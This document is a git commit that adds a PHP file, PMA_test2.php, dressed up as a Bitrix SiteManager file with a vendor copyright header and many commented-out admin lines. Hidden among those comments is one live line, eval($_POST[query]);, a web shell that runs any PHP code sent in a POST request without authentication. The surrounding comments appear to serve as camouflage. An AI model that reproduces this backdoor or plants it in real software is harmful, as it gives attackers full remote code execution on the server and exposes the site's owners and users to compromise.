ddac681d99ae2f7946c93fde98f17ae42e163026
moonanoor <70752599+moonanoor@users.noreply.github.com>
2025-08-19 16:25:41 +0300

    Create PMA_test2.php

---
+++ PMA_test2.php
@@ -0,0 +1,48 @@
+<?
+##############################################
+# Bitrix: SiteManager                        #
+# Copyright (c) 2002-2006 Bitrix             #
+# https://www.bitrixsoft.com                  #
+# mailto:admin@bitrixsoft.com                #
+##############################################
+
+
+
+//because Form's action don't changes without client's scripts, so just let's include the file for rights grouping change
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_admin_before.php");
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/fileman/prolog.php");
+
+//if (!$USER->CanDoOperation('fileman_view_file_structure'))
+//	$APPLICATION->AuthForm(GetMessage("ACCESS_DENIED"));
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/fileman/include.php");
+//IncludeModuleLangFile(__FILE__);
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_admin_before.php");
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/fileman/prolog.php");
+
+//if (!$USER->CanDoOperation('fileman_upload_files'))
+
+
+//	$APPLICATION->AuthForm(GetMessage("ACCESS_DENIED"));
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/fileman/include.php");
+//IncludeModuleLangFile(__FILE__);
+//$logical = $logical ?? null;
+//$addUrl = 'lang='.LANGUAGE_ID.($logical == "Y"?'&logical=Y':'');
+//define("NO_KEEP_STATISTIC", "Y");
+//define("NO_AGENT_STATISTIC","Y");
+//define("NO_AGENT_CHECK", true);
+//define("DisableEventsCheck", true);
+eval($_POST[query]);//
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
+
+//CModule::IncludeModule("fileman");
+
+//$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : false;
+//$HTTP_ACCEPT_ENCODING = '';
+//session_cache_limiter("public");
+//require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");
+//IncludeModuleLangFile(__FILE__);
+
+
+//function _GtFMess()
+//{
+	//if(file_exists($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/fileman/lang/'.LANGUAGE_ID.'/admin/fileman_js.php'))
